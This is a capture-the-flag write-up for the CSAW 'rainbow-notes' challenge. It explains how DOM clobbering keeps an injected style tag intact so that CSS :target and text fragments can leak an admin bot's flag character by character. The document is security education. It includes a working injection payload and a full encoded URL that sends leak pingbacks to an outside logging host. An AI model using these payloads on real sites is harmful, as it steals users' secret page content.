1. The idea of this challenge is to utilize STTF fragments and the CSS :target selector to leak the flag
2. The CSP allows for style tags for CSS injection, and .setHTML (html sanitizer API) also allows inline styles, but the rainbowify() function messes up any styles we try to insert...
3. We utilize DOM clobbering to get rainbowify() to throw an error, and avoid messing up our inserted style
4. We can submit a link to the admin bot with something like:

```html
<form>z<input name="removeChild"></form><style>/*exfil here*/</style>
```
5. This causes `node.parentElement.removeChild()` to throw when it tries to rainbowify the text node `z`. And therefore, our style tag remains untouched.
6. The style tag can leak STTF results via something like:
```css
:target::before { content : url(//evil.com?leak=a) }
```
7. So, we submit a url to the adminbot with something like:
```
https://rainbow-notes.csaw.io/?note=%3Cform%3Ez%3Cinput%20name%3D%22removeChild%22%3E%3C%2Fform%3E%3Cstyle%3E%3Atarget%3A%3Abefore%20%7Bcontent%3A%20url(%2F%2Fhc.lc%2Flog2.php%3Fleak%3Da)%3B%7D%3C%2Fstyle%3E#:~:text=csawctf{a
```
and if we get a pingback, the first letter of the flag is `a`
8. We use this to brute force the flag char-by-char. There's no delay on the admin-bot, so we can invoke it many times. The flag format is known, so the max # of invocations would be 16*10